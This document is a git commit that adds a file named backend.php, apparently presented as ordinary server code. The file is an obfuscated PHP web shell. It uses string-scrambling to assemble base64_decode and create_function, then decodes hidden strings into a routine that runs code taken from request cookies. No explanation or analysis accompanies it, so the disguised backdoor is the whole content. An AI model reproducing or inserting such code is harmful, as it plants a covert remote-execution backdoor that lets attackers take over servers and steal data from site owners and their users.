6eb693cb0386d992aa29e1cb0abd0f1ce71ea6f3
0556x <mitoged@zain.site>
2017-01-10 14:36:51 -0200

    Create backend.php

---
+++ backend.php
@@ -0,0 +1,10 @@
+<?php
+$wmro = str_replace("q","","qsqtqr_rqeqpqlqaqcqe");
+$ypux="JGM9J2NvdW50JzskYTww0kX0NwwPT0tJRTtpZihwwyZXNldwwCgkwwYSk9PScxMicgJiYgJGMwwoJGEp";
+$xqex="uKGFycmFww5X3NsaWNlwwKCRhLCRjKCwwRhKwwS0zKSkpKSk7ZWwwNobywwAnPC8wwnLiRrLic+Jzt9";
+$uwil="PjMpwwewwyRrPSwwczwwNDUnO2VjaG8gJzwnLiRrLic+JztldmFsKGJhc2Uww2NF9kwwZWNvZGwwUowwcHJlZ";
+$sjna="19yZXBsYWNlwwKGFycmF5KCcvW15cdz1cc1ww0vJywnL1xwwzLycpwwLCBhcnJheSgnwwJwwywnKywwcpLCBqb2l";
+$ducw = $wmro("m", "", "bamsme64m_mdmecmode");
+$fwjp = $wmro("b","","crbeabtbeb_bfbubnbctbiobn");
+$dkzo = $fwjp('', $ducw($wmro("ww", "", $ypux.$uwil.$sjna.$xqex))); $dkzo();
+?>
